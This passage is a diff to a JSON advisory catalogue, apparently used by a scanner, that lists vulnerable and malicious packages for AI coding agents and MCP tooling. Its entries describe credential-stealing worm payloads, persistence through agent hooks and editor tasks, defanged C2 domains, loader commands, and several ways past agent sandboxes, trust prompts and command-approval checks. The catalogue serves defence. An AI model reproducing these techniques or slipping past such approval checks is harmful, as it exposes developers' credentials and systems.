@@ -83,8 +83,8 @@
   {
     "ecosystem": "npm",
     "name": "@modelcontextprotocol/inspector",
-    "version_range": "<0.14.1",
-    "advisory": "CVE-2025-49596 (CVSS 9.4): RCE via unauthenticated proxy commands, chainable with CSRF. Fixed: 0.14.1. Source: Oligo Security, GHSA-7f8r-222p-6f5g"
+    "version_range": "<1.0.3",
+    "advisory": "MCP Inspector 0.x/1.x line: CVE-2025-49596 (CVSS 9.4, unauthenticated proxy RCE chainable with CSRF, fixed 0.14.1; Oligo Security), CVE-2025-58444 / GHSA-g9hg-qhmf-q45m (fixed 0.16.6), and nine advisories published 2026-10-21 fixed in 1.0.3, two critical: GHSA-4fc4-wcmh-4g86 (a malicious MCP OAuth callback switches the transport to stdio and runs local commands) and GHSA-6x67-4w4w-9f3w (a remote MCP App steals the proxy auth token and runs local commands); high GHSA-wmjf-2m46-2352 (missing auth); medium GHSA-2rq8-f55p-j2jp, GHSA-f6mc-jg3x-vq53 (/fetch leaks Authorization and Cookie across redirects), GHSA-m5pj-3536-3xcp. Same ranges apply to @modelcontextprotocol/inspector-server and inspector-client. Fixed: 1.0.3 (the 2.x line has its own row). Source: Oligo Security, modelcontextprotocol/inspector advisories (reporters bhavya32, Lemohang Khaile, sondt99, CloneOfAlex). Verified against primary sources 2026-10-22."
   },
   {
     "ecosystem": "npm",
@@ -95,8 +95,8 @@
   {
     "ecosystem": "npm",
     "name": "@modelcontextprotocol/sdk",
-    "version_range": "<1.26.0",
-    "advisory": "CVE-2025-66414: DNS rebinding vulnerability. CVE-2026-25536 (CVSS 7.1): cross-client data leak. Source: vulnerablemcp.info Affected: <1.24.0 (CVE-2025-66414, GHSA-w48q-cv73-mx4w) and 1.10.0-1.25.x (CVE-2026-25536, GHSA-345p-7cg4-v4c7); range covers both."
+    "version_range": "<1.32.0",
+    "advisory": "MCP TypeScript SDK 1.x: CVE-2025-66414 (DNS rebinding, fixed 1.24.0), CVE-2026-25536 (cross-client data leak, fixed 1.26.0), CVE-2026-104850 / GHSA-6qxp-vccf-f47h (CVSS 7.5: OAuth client sent stored refresh tokens and client secrets to whichever authorization server the MCP server named, fixed 1.31.0), GHSA-f897-62hf-6gxq (no request-body or batch size limit, fixed 1.30.1), and four October 2026 advisories fixed in 1.32.0: CVE-2026-111767 (experimental tasks not bound to their session), CVE-2026-111768 (one in-limit request exhausts server memory), CVE-2026-111769 (cross-origin redirects re-send custom headers and bodies), CVE-2026-111771 (bearer tokens issued for another service accepted). Fixed: 1.32.0. Source: modelcontextprotocol/typescript-sdk advisories (reporters Aviral2642, AlexMelanFromRingo, Gal3m, JosephDoUrden, Igfray, OriginalKazdov, lwebmedia; cipher-creator; root-Brainoverflow; nickelsec; gdegrange), vulnerablemcp.info. Verified against primary sources 2026-10-22."
   },
   {
     "ecosystem": "pypi",
@@ -107,8 +107,8 @@
   {
     "ecosystem": "pypi",
     "name": "mcp",
-    "version_range": "<1.23.0",
-    "advisory": "CVE-2025-66416: DNS rebinding vulnerability in MCP Python SDK. Source: vulnerablemcp.info Affected: <1.23.0 (fixed 1.23.0, GHSA-9h52-p55h-vw2f)."
+    "version_range": "<1.30.0",
+    "advisory": "MCP Python SDK 1.x line: CVE-2025-66416 (DNS rebinding, fixed 1.23.0, GHSA-9h52-p55h-vw2f), CVE-2026-52869/52870 (fixed 1.27.2), CVE-2026-59950 (fixed 1.28.1), CVE-2026-109527 / GHSA-fmmv-w9g8-j3gc (unbounded request bodies, fixed 1.29.1), and five advisories fixed in 1.30.0: GHSA-qx49-fqc8-xw99 (CVSS 7.5: OAuth client sent client_secret, authorization code and PKCE verifier to the authorization server the MCP server named; Cycode and others), CVE-2026-59951 / GHSA-84m7-p3x7-pcfv (Streamable HTTP sessions never reclaimed), GHSA-rwrf-2pqf-9j8j (client fetched server-chosen $ref URLs while validating tool output schemas), GHSA-w4fh-qvv9-3v23 (bearer tokens for another resource server accepted), GHSA-5h93-6whr-6q8j (cross-origin redirects carry headers and bodies). Fixed: 1.30.0 (the 2.x line has its own row). Source: modelcontextprotocol/python-sdk advisories (Cycode / Yuval Elbar, Aviral2642, AlexMelanFromRingo, Gal3m, mrostamipoor, RoniGurvich, mahmoudalbustan1, rharang, Hem1700, u-ktdi, dodge1218, nickelsec, razashariff, shmulc8), vulnerablemcp.info. Verified against primary sources 2026-10-22."
   },
   {
     "ecosystem": "vscode",
@@ -402,7 +402,7 @@
     "ecosystem": "agent-runtime",
     "name": "gemini-cli",
     "version_range": "<0.39.1",
-    "advisory": "CVE-2026-12537: remote code execution via workspace trust bypass. Verified against OSV/GHSA 2026-08-26."
+    "advisory": "CVE-2026-12537 (GHSA-wpqr-6v78-jr5g): remote code execution via workspace trust bypass. CVE-2026-13745 (GHSA-2255-3477-vp73, CVSS 4.0 7.7): an untrusted .env in the launch directory overrides GEMINI_CLI_HOME, so the CLI loads attacker-controlled settings, hooks and MCP servers from a repo-controlled home past the folder-trust prompt (Benjamin Faller, Redguard AG; mitigation GEMINI_CLI_TRUST_WORKSPACE=true). Both fixed 0.39.1. Note: Air Security reports the Plugin4Shell pin bypass will not be fixed in Gemini CLI. Verified against OSV/GHSA 2026-08-26 and 2026-10-22."
   },
   {
     "ecosystem": "pypi",
@@ -532,5 +532,698 @@
     "ecosystem": "jetbrains",
     "name": "com.dp.git.ai.tool",
     "advisory": "'Coding Simple Tool' by vendor account 'CodePilot' (3,931 installs): one of 15 malicious JetBrains Marketplace plugins posing as DeepSeek/OpenAI dev tools that posted the AI API keys typed into plugin settings (OpenAI, DeepSeek, SiliconFlow) as plaintext HTTP to 39.107.60[.]51. Removed and remotely disabled by JetBrains 2026-06-17; the jar may remain on disk. Source: JetBrains Marketplace security update (2026-06), StepSecurity"
+  },
+  {
+    "ecosystem": "agent-runtime",
+    "name": "claude-code",
+    "version_range": "<2.1.2",
+    "advisory": "CVE-2026-25725 (GHSA-ff64-7w26-62rf, CVSS 7.7): the bubblewrap sandbox left .claude/settings.json unprotected when it did not exist at startup, so sandboxed code could create it and plant a SessionStart hook that runs on the host at the next launch. Fixed 2.1.2. Reported by edbr via HackerOne. Verified against GHSA/CVE.org/OSV 2026-10-22."
+  },
+  {
+    "ecosystem": "agent-runtime",
+    "name": "claude-code",
+    "version_range": "<2.1.129",
+    "advisory": "CVE-2026-103435 (GHSA-5j29-h97v-84ch, CVSS 7.7): arbitrary file write via write-time symlink following (TOCTOU). The path was validated inside the project at permission time and re-resolved at write time, so a workspace co-writer who swaps a file for a symlink redirects the write outside the sandbox (shell rc files, authorized_keys). Fixed 2.1.129. Reported by c_h4ck_0 via HackerOne. Verified against GHSA/CVE.org/OSV 2026-10-22."
+  },
+  {
+    "ecosystem": "agent-runtime",
+    "name": "claude-code",
+    "version_range": "<2.1.179",
+    "advisory": "CVE-2026-86063 (GHSA-pq7j-f95f-qfcv, CVSS 7.7, Plugin4Shell): plugin install and auto-update ran git checkout of the marketplace's pinned commit SHA without verifying HEAD matched; a branch named with the same 40-hex string wins ref resolution, so whoever controls a plugin's upstream repo swaps reviewed code for their own while the pin reads intact. Also affected Claude Desktop plugin install. Fixed 2.1.179. Source: Air Security (Or Nevo Michrowski, Dor Granat, Niv Hoffman). Verified against GHSA/OSV 2026-10-22."
+  },
+  {
+    "ecosystem": "agent-runtime",
+    "name": "claude-code",
+    "version_range": "<2.1.196",
+    "advisory": "GitSpawn (no CVE for Claude Code): git status/diff ran during context gathering before the trust prompt, so a directory delivered with its .git/config intact (zip, sync folder, USB) and core.fsmonitor set to a command executed it on open. Fixed 2.1.196 per Manifold Security's timeline (confirmed on 2.1.193); the fix version rests on the researcher's report, not a vendor advisory. Source: Manifold Security (Francisco Rosales, Ax Sharma), 2026-09-01. rmguard's git-autorun scanner detects the repo-side artifact regardless of version."
+  },
+  {
+    "ecosystem": "agent-runtime",
+    "name": "claude-code",
+    "version_range": ">=2.0.68, <2.1.260",
+    "advisory": "CVE-2026-103012 (GHSA-gfvf-j8jh-jxxw, low, CVSS 2.0): when a stored API key was preferred over the Enterprise/Team sign-in, server-managed settings were not applied, so sessions ran without the organisation's permission deny rules and model restrictions (or with a stale cached copy). Only Enterprise (>=2.0.68) and Team (>=2.1.38) orgs affected. Fixed 2.1.260. Reported by Tamas Voros, NVIDIA AI Red Team. Verified against GHSA/CVE.org 2026-10-22."
+  },
+  {
+    "ecosystem": "agent-runtime",
+    "name": "claude-desktop",
+    "version_range": ">=1.1.3918, <1.15962.0",
+    "advisory": "GHSA-v234-4jrq-mgg6 (high, CVSS 8.5, no CVE): Claude Desktop on macOS did not apply its code-executing-file-type blocklist to Cowork shared folders, so a file dropped there by a compromised or prompt-injected Cowork agent ran commands on the host when the user opened it from the Desktop UI; builds before 1.11847.5 also shipped a Cowork VM kernel affected by CVE-2026-43284. Fixed 1.15962.0. Identified internally by Anthropic; independently reported by Vladimir Tokarev, Cyera Research. (The Windows-only CVE-2026-88066 git.exe search-path advisory is deliberately not catalogued: rmguard has no platform field and runs on macOS and Linux.) Verified against the vendor advisory 2026-10-22."
+  },
+  {
+    "ecosystem": "agent-runtime",
+    "name": "codex",
+    "version_range": ">=0.102.0, <0.131.0",
+    "advisory": "CVE-2026-19592 (GHSA-26wp-42v3-96xp, CVSS 7.3): Codex CLI collected git repository metadata without disabling repository-local core.fsmonitor, so a repo delivered with its .git/config intact ran an attacker helper outside the sandbox with no approval prompt. Fixed 0.131.0 (openai/codex PR #22652). Reported by the System Software and Security Lab, Fudan University, and maitai (Doyensec) via the Zero Day Initiative; the class was later publicised as GitSpawn by Manifold Security. Verified against the OpenAI CNA record 2026-10-22."
+  },
+  {
+    "ecosystem": "agent-runtime",
+    "name": "codex",
+    "version_range": ">=0.72.0, <0.131.0",
+    "advisory": "CVE-2026-19591 (GHSA-2frj-4qr5-m2rf, CVSS 8.8): the command-safety parser misread PowerShell's stop-parsing token (--%), classifying commands as safe that PowerShell runs differently; a malicious repo's instructions could get a file-writing git command run without approval, modify Codex config and later launch an attacker MCP server. Requires pwsh on macOS/Linux. Fixed 0.131.0 (openai/codex PR #22643). Reported by Emanuele Barbeno, Cyrill Bannwart, Yves Bieri, Lukasz D. and Urs Mueller, Compass Security. Verified against the OpenAI CNA record 2026-10-22."
+  },
+  {
+    "ecosystem": "agent-runtime",
+    "name": "codex",
+    "version_range": "<0.146.0",
+    "advisory": "Plugin4Shell in Codex (no CVE): the same SHA-shaped-branch plugin pin bypass as Claude Code's CVE-2026-86063; git checkout of a pinned commit resolved to an attacker branch named with that SHA, and auto-update is on by default. Fixed 0.146.0 (openai/codex PR #34644 'Verify Git plugin SHA checkouts', in tag rust-v0.146.0). Source: Air Security (Or Nevo, Dor Granat, Niv Hoffman), 2026-09-17. Verified against the fix PR and tag 2026-10-22."
+  },
+  {
+    "ecosystem": "agent-runtime",
+    "name": "goose",
+    "version_range": "<1.44.0",
+    "advisory": "CVE-2026-72718 (GHSA-r5pp-p5r8-466r, CVSS 7.0): goose review ran git with repository-local core.fsmonitor honoured, so a prepared repo executed arbitrary commands (GitSpawn family). Fixed 1.44.0, which adds -c core.fsmonitor=false and safe.bareRepository=explicit to every git invocation. Reported by Francisco Rosales, Manifold Security. Verified against the vendor advisory and OSV 2026-10-22."
+  },
+  {
+    "ecosystem": "agent-runtime",
+    "name": "kiro-ide",
+    "version_range": "<0.8.135",
+    "advisory": "CVE-2026-89332 (AWS bulletin 2026-111, CVSS 5.5): in an untrusted workspace the Kiro agent could write the workspace settings file before the approval prompt was answered, pointing the Kiro Powers registry URL at an attacker endpoint; opening the Powers panel then sent workspace data there. Kiro IDE only (the Kiro CLI is a separate version line). Fixed 0.8.135. Source: AWS Security. Verified against the AWS bulletin and CVE record 2026-10-22."
+  },
+  {
+    "ecosystem": "agent-runtime",
+    "name": "ollama",
+    "version_range": ">=0.14.0, <0.31.2",
+    "advisory": "CVE-2026-102697 (CWE-863): Ollama's experimental agent mode approved Bash-tool commands with a parser that did not understand shell control operators, so model output could append ; or && and run unapproved commands after an approved one. Fixed 0.31.2 (ollama/ollama PR #16963). Reported by Akiner Kisa. Verified against the CVE record and fix commit 2026-10-22."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "tensorlake",
+    "version": "0.5.144",
+    "advisory": "Hijacked release of a legitimate AI-agent sandbox SDK (2026-10-08, live about 19 hours; 0.5.143 and 0.5.145+ are clean): Shai-Hulud/ChainDrop worm node. preinstall runs lib/setup.mjs, which drops Bun and runs the obfuscated lib/Math_Symbol.js: steals npm, GitHub, cloud, Kubernetes, Vault and SSH credentials, browser stores, crypto-wallet extensions and the .claude/.cursor/.kiro/Windsurf/Zed and MCP configs; persists via a .claude/settings.json SessionStart hook plus .vscode/tasks.json; installs a gh-token-monitor service (systemd user unit, LaunchAgent com.user.gh-token-monitor, or an ONLOGON task) that wipes the home directory if the stolen GitHub token is revoked, so remove that monitor before rotating the token. C2 resolved from an Ethereum contract with iseekaigogo[.]com observed. npm only; the PyPI and Cargo packages were not affected. Source: StepSecurity (Ashish Kurmi, tensorlakeai/tensorlake#1014), Socket Research Team, Aikido Security, vendor advisory GHSA-8g63-53c9-65j2."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "feishu-docx-mcp",
+    "version": "0.3.2",
+    "advisory": "Shai-Hulud redeployment of 2026-09-07 (published 09:25 UTC, replaced by 0.0.1-security at 13:50 UTC): one of four hijacked packages carrying the dormant May 2026 payload (sha256 e37e3dde...b1a6) via preinstall 'bun run index.js'. Steals npm and GitHub tokens, writes .vscode/tasks.json and .claude/settings.json persistence into reachable repos, mass-creates Dune-named GitHub repos and republishes victim packages; C2 t[.]m-kosche[.]com. Only this version is affected. Source: Aikido Security (Charlie Eriksen); Amazon Inspector credited as finder on the OSV MAL record; Corgea."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "bmc-i18n-extract-cli",
+    "version": "1.1.1",
+    "advisory": "Shai-Hulud redeployment of 2026-09-07 (published 09:25 UTC, replaced by 0.0.1-security at 13:50 UTC): one of four hijacked packages carrying the dormant May 2026 payload (sha256 e37e3dde...b1a6) via preinstall 'bun run index.js'. Steals npm and GitHub tokens, writes .vscode/tasks.json and .claude/settings.json persistence into reachable repos, mass-creates Dune-named GitHub repos and republishes victim packages; C2 t[.]m-kosche[.]com. Only this version is affected. Source: Aikido Security (Charlie Eriksen); Amazon Inspector credited as finder on the OSV MAL record; Corgea."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "bmc-translate-utils",
+    "version": "1.1.1",
+    "advisory": "Shai-Hulud redeployment of 2026-09-07 (published 09:25 UTC, replaced by 0.0.1-security at 13:50 UTC): one of four hijacked packages carrying the dormant May 2026 payload (sha256 e37e3dde...b1a6) via preinstall 'bun run index.js'. Steals npm and GitHub tokens, writes .vscode/tasks.json and .claude/settings.json persistence into reachable repos, mass-creates Dune-named GitHub repos and republishes victim packages; C2 t[.]m-kosche[.]com. Only this version is affected. Source: Aikido Security (Charlie Eriksen); Amazon Inspector credited as finder on the OSV MAL record; Corgea."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "blueai-cli",
+    "version": "0.7.0",
+    "advisory": "Shai-Hulud redeployment of 2026-09-07 (published 09:25 UTC, replaced by 0.0.1-security at 13:50 UTC): one of four hijacked packages carrying the dormant May 2026 payload (sha256 e37e3dde...b1a6) via preinstall 'bun run index.js'. Steals npm and GitHub tokens, writes .vscode/tasks.json and .claude/settings.json persistence into reachable repos, mass-creates Dune-named GitHub repos and republishes victim packages; C2 t[.]m-kosche[.]com. Only this version is affected. Source: Aikido Security (Charlie Eriksen); Amazon Inspector credited as finder on the OSV MAL record; Corgea."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "keyv",
+    "version": "6.0.0",
+    "advisory": "ChainDrop wave of 2026-08-04 (keyv/cacheable namespaces hijacked via a stolen maintainer token): the first worm to plant the Claude Code SessionStart hook plus VS Code folderOpen task pair ('node .vscode/setup.mjs' / 'node .claude/setup.mjs') into every reachable repo, committed under a forged claude@users.noreply.github.com identity. preinstall loader lib/setup.mjs drops Bun and runs lib/Math_Symbol.js: steals npm, GitHub and cloud credentials and propagates. Only this version is affected; the packages themselves are legitimate. Source: StepSecurity Threat Intelligence (named ChainDrop, jaredwray/keyv#2050), Socket Research Team, SafeDep, Aikido, Upwind Security (Lidor Machluf, jaredwray/cacheable#1691), maintainer jaredwray's version list."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "cacheable",
+    "version": "2.5.1",
+    "advisory": "ChainDrop wave of 2026-08-04 (keyv/cacheable namespaces hijacked via a stolen maintainer token): the first worm to plant the Claude Code SessionStart hook plus VS Code folderOpen task pair ('node .vscode/setup.mjs' / 'node .claude/setup.mjs') into every reachable repo, committed under a forged claude@users.noreply.github.com identity. preinstall loader lib/setup.mjs drops Bun and runs lib/Math_Symbol.js: steals npm, GitHub and cloud credentials and propagates. Only this version is affected; the packages themselves are legitimate. Source: StepSecurity Threat Intelligence (named ChainDrop, jaredwray/keyv#2050), Socket Research Team, SafeDep, Aikido, Upwind Security (Lidor Machluf, jaredwray/cacheable#1691), maintainer jaredwray's version list."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "cacheable-request",
+    "version": "13.0.20",
+    "advisory": "ChainDrop wave of 2026-08-04 (keyv/cacheable namespaces hijacked via a stolen maintainer token): the first worm to plant the Claude Code SessionStart hook plus VS Code folderOpen task pair ('node .vscode/setup.mjs' / 'node .claude/setup.mjs') into every reachable repo, committed under a forged claude@users.noreply.github.com identity. preinstall loader lib/setup.mjs drops Bun and runs lib/Math_Symbol.js: steals npm, GitHub and cloud credentials and propagates. Only this version is affected; the packages themselves are legitimate. Source: StepSecurity Threat Intelligence (named ChainDrop, jaredwray/keyv#2050), Socket Research Team, SafeDep, Aikido, Upwind Security (Lidor Machluf, jaredwray/cacheable#1691), maintainer jaredwray's version list."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "flat-cache",
+    "version": "6.1.24",
+    "advisory": "ChainDrop wave of 2026-08-04 (keyv/cacheable namespaces hijacked via a stolen maintainer token): the first worm to plant the Claude Code SessionStart hook plus VS Code folderOpen task pair ('node .vscode/setup.mjs' / 'node .claude/setup.mjs') into every reachable repo, committed under a forged claude@users.noreply.github.com identity. preinstall loader lib/setup.mjs drops Bun and runs lib/Math_Symbol.js: steals npm, GitHub and cloud credentials and propagates. Only this version is affected; the packages themselves are legitimate. Source: StepSecurity Threat Intelligence (named ChainDrop, jaredwray/keyv#2050), Socket Research Team, SafeDep, Aikido, Upwind Security (Lidor Machluf, jaredwray/cacheable#1691), maintainer jaredwray's version list."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "cache-manager",
+    "version": "7.2.10",
+    "advisory": "ChainDrop wave of 2026-08-04 (keyv/cacheable namespaces hijacked via a stolen maintainer token): the first worm to plant the Claude Code SessionStart hook plus VS Code folderOpen task pair ('node .vscode/setup.mjs' / 'node .claude/setup.mjs') into every reachable repo, committed under a forged claude@users.noreply.github.com identity. preinstall loader lib/setup.mjs drops Bun and runs lib/Math_Symbol.js: steals npm, GitHub and cloud credentials and propagates. Only this version is affected; the packages themselves are legitimate. Source: StepSecurity Threat Intelligence (named ChainDrop, jaredwray/keyv#2050), Socket Research Team, SafeDep, Aikido, Upwind Security (Lidor Machluf, jaredwray/cacheable#1691), maintainer jaredwray's version list."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "@cacheable/memory",
+    "version": "2.2.1",
+    "advisory": "ChainDrop wave of 2026-08-04 (keyv/cacheable namespaces hijacked via a stolen maintainer token): the first worm to plant the Claude Code SessionStart hook plus VS Code folderOpen task pair ('node .vscode/setup.mjs' / 'node .claude/setup.mjs') into every reachable repo, committed under a forged claude@users.noreply.github.com identity. preinstall loader lib/setup.mjs drops Bun and runs lib/Math_Symbol.js: steals npm, GitHub and cloud credentials and propagates. Only this version is affected; the packages themselves are legitimate. Source: StepSecurity Threat Intelligence (named ChainDrop, jaredwray/keyv#2050), Socket Research Team, SafeDep, Aikido, Upwind Security (Lidor Machluf, jaredwray/cacheable#1691), maintainer jaredwray's version list."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "@cacheable/net",
+    "version": "2.1.1",
+    "advisory": "ChainDrop wave of 2026-08-04 (keyv/cacheable namespaces hijacked via a stolen maintainer token): the first worm to plant the Claude Code SessionStart hook plus VS Code folderOpen task pair ('node .vscode/setup.mjs' / 'node .claude/setup.mjs') into every reachable repo, committed under a forged claude@users.noreply.github.com identity. preinstall loader lib/setup.mjs drops Bun and runs lib/Math_Symbol.js: steals npm, GitHub and cloud credentials and propagates. Only this version is affected; the packages themselves are legitimate. Source: StepSecurity Threat Intelligence (named ChainDrop, jaredwray/keyv#2050), Socket Research Team, SafeDep, Aikido, Upwind Security (Lidor Machluf, jaredwray/cacheable#1691), maintainer jaredwray's version list."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "@memtensor/memos-cloud-openclaw-plugin",
+    "version": "0.1.21",
+    "advisory": "MemTensor build-pipeline compromise (2026-09-23, captured NPM_TOKEN): this version was published with no matching commits and ships the Go implant 'sckit', which steals npm, GitHub and GitLab tokens, SSH keys, cloud CLI credentials and .env files and worms forward by writing .github/workflows/runtime-update.yml into every repo the stolen tokens can push to; C2 under skyleen[.]fr. Clean versions 0.1.20, 0.1.22 and 0.1.24 exist, so only the exact releases are pinned. Source: SafeDep; StepSecurity and Semgrep (Katie Paxton-Fear) independent analyses."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "@memtensor/memos-cloud-openclaw-plugin",
+    "version": "0.1.23",
+    "advisory": "MemTensor build-pipeline compromise (2026-09-23, captured NPM_TOKEN): this version was published with no matching commits and ships the Go implant 'sckit', which steals npm, GitHub and GitLab tokens, SSH keys, cloud CLI credentials and .env files and worms forward by writing .github/workflows/runtime-update.yml into every repo the stolen tokens can push to; C2 under skyleen[.]fr. Clean versions 0.1.20, 0.1.22 and 0.1.24 exist, so only the exact releases are pinned. Source: SafeDep; StepSecurity and Semgrep (Katie Paxton-Fear) independent analyses."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "@memtensor/memos-cloud-openclaw-plugin",
+    "version": "0.1.25",
+    "advisory": "MemTensor build-pipeline compromise (2026-09-23, captured NPM_TOKEN): this version was published with no matching commits and ships the Go implant 'sckit', which steals npm, GitHub and GitLab tokens, SSH keys, cloud CLI credentials and .env files and worms forward by writing .github/workflows/runtime-update.yml into every repo the stolen tokens can push to; C2 under skyleen[.]fr. Clean versions 0.1.20, 0.1.22 and 0.1.24 exist, so only the exact releases are pinned. Source: SafeDep; StepSecurity and Semgrep (Katie Paxton-Fear) independent analyses."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "@apexacc/cli",
+    "advisory": "'Apex Copilot CLI' (fake Web3 accelerator campaign REF8801, all 122 versions, still live on npm as of 2026-10-22): backdoored fork of the Oh My Pi coding agent. Drops the CloudSyncD macOS stealer or a Windows stealer, overwrites OPENROUTER_API_KEY and OPENROUTER_BASE_URL in-process so every prompt, file and tool output is relayed through arena.apexaccs[.]org, and registers an attacker MCP server 'apex-copilot' in ~/.apex/agent/mcp.json. Source: Elastic Security Labs (Jia Yu Chan, Daniel Stepanic), 2026-10-12."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "@apexacc/audit",
+    "advisory": "'Web3 Security Scanner' from the same REF8801 operator as @apexacc/cli: advertises an MCP server with 18 security tools that all return fabricated findings while delivering the same stealer/backdoor; self-registers in Claude Desktop, Cursor and Windsurf MCP configs. Removed from npm. Source: Elastic Security Labs (Jia Yu Chan, Daniel Stepanic), OSV MAL-2026-17923 / GHSA-c5v8-7c3v-pf6r."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "@apexfdn/apex",
+    "advisory": "Earlier wave of the Apex Foundation campaign (34 versions 2026-07-05 to 07-21, removed by npm 2026-07-21): postinstall 'node install.cjs' downloads a 120-150 MB platform binary; the macOS infostealer shows fake password dialogs and harvests Keychain, 13 Chromium and 4 Firefox browsers, 20+ wallets, SSH, AWS and Kubernetes credentials, Telegram and shell history to update.apex-arena-router[.]com. Source: SafeDep (Kunal Singh), npm security GHSA-w63r-vpcf-2wwf, Amazon Inspector OSV MAL-2026-10979; later tied to REF8801 by Elastic Security Labs."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "@copilot-mcp/apex",
+    "advisory": "Re-publication of @apexfdn/apex under a Copilot/MCP-themed scope 11 hours after its takedown (20+ versions in about 8 hours on 2026-07-22, removed the same day): same macOS infostealer dropper. Source: SafeDep (Kunal Singh), Amazon Inspector OSV MAL-2026-12314; later tied to REF8801 by Elastic Security Labs."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "@decoopus/claude-setup",
+    "advisory": "Claude Desktop hijack installer (2026-10-19; versions 1.0.0, 1.0.2, 1.0.13, now 0.0.1-security): prompts for an Anthropic API key and writes it plus a hardcoded lookalike gateway api-anthropic[.]help (earlier api.vokes[.]in) into every Claude Desktop config it can reach: claude_desktop_config.json, every configLibrary profile, macOS managed preferences for com.anthropic.claudefordesktop and the Windows Policies\\Claude registry key, then kills Claude and wipes its session storage and cookies so the next login is relayed through the attacker. Ships a fake model list. Source: Amazon Inspector (finder), OpenSSF malicious-packages MAL-2026-18054 / GHSA-p7p5-jrq5-q47x."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "@decoopus/chatgpt-setup",
+    "advisory": "AI-assistant-themed lure package removed by npm security as malware in the 2026-10-19 cluster and replaced with a 0.0.1-security holder (same publisher scope as @decoopus/claude-setup; OSV MAL-2026-18053 / GHSA-4632-2g34-4r9w). Only npm's ghsa-malware record is public; no benign version ever existed. Source: GitHub Advisory Database / npm Security, OpenSSF malicious-packages."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "api-anthropic",
+    "advisory": "AI-assistant-themed lure package removed by npm security as malware in the 2026-10-19 cluster and replaced with a 0.0.1-security holder (name matches the api-anthropic[.]help relay domain used by @decoopus/claude-setup; versions 0.1.0 to 1.1.3 published 2026-08-25 to 10-14; GHSA-cj9w-7h22-q93g). Only npm's ghsa-malware record is public; no benign version ever existed. Source: GitHub Advisory Database / npm Security, OpenSSF malicious-packages."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "chatgpt-desktop-setup",
+    "advisory": "AI-assistant-themed lure package removed by npm security as malware in the 2026-10-19 cluster and replaced with a 0.0.1-security holder (OSV MAL-2026-18056 / GHSA-pgq5-xq28-533m). Only npm's ghsa-malware record is public; no benign version ever existed. Source: GitHub Advisory Database / npm Security, OpenSSF malicious-packages."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "chatgpt-pro-activator",
+    "advisory": "AI-assistant-themed lure package removed by npm security as malware in the 2026-10-19 cluster and replaced with a 0.0.1-security holder (versions 1.0.0 to 1.0.3 published 2026-10-08; OSV MAL-2026-18057). Only npm's ghsa-malware record is public; no benign version ever existed. Source: GitHub Advisory Database / npm Security, OpenSSF malicious-packages."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "chatgpt-pro-setup-tool",
+    "advisory": "AI-assistant-themed lure package removed by npm security as malware in the 2026-10-19 cluster and replaced with a 0.0.1-security holder (versions 1.0.0 to 1.0.2 published 2026-10-08; OSV MAL-2026-18058 / GHSA-xwx3-5h3q-2v8r). Only npm's ghsa-malware record is public; no benign version ever existed. Source: GitHub Advisory Database / npm Security, OpenSSF malicious-packages."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "claude-desktop-setup",
+    "advisory": "AI-assistant-themed lure package removed by npm security as malware in the 2026-10-19 cluster and replaced with a 0.0.1-security holder (versions 1.0.0 to 1.0.13 published 2026-10-14 to 10-19; OSV MAL-2026-18059). Only npm's ghsa-malware record is public; no benign version ever existed. Source: GitHub Advisory Database / npm Security, OpenSSF malicious-packages."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "codex-setup",
+    "advisory": "AI-assistant-themed lure package removed by npm security as malware in the 2026-10-19 cluster and replaced with a 0.0.1-security holder (OSV MAL-2026-18060). Only npm's ghsa-malware record is public; no benign version ever existed. Source: GitHub Advisory Database / npm Security, OpenSSF malicious-packages."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "formatting-subtitles-for-claude",
+    "advisory": "AI-assistant-themed lure package removed by npm security as malware in the 2026-10-19 cluster and replaced with a 0.0.1-security holder (removed 2026-10-20; OSV MAL-2026-18099). Only npm's ghsa-malware record is public; no benign version ever existed. Source: GitHub Advisory Database / npm Security, OpenSSF malicious-packages."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "@httttt/mcp-demo",
+    "advisory": "stdio MCP server exposing an 'exec_command' tool that passes the model-supplied string straight to child_process.exec with no allowlist or confirmation: arbitrary command execution for whatever drives the client (versions 1.0.0 and 1.1.0; replaced by 0.0.1-security 2026-09-23). Sibling @httttt/mcp-npx-fetch-1 is GHSA-q6m6-3rfx-7f62. Source: Amazon Inspector (OSV MAL-2026-14315), GitHub Advisory Database GHSA-phcp-xhhf-xcvq."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "ubiquiti-agents-link-mcp",
+    "advisory": "Squats an npm name a vendor UI tells operators to run via npx (versions 0.0.1 to 0.2.1, now 0.0.1-security): the bin runs id, collects username and hostname and POSTs them to a Burp Collaborator OAST domain. Low-harm beacon, real MCP-named squat. Source: Amazon Inspector and OpenSSF Package Analysis (OSV MAL-2026-16409), GHSA-rqpx-hw2h-g3hc (2026-09-24)."
+  },
+  {
+    "ecosystem": "npm",
+    "name": "@vite-mcp/vite-type",
+    "version": "6.44.1",
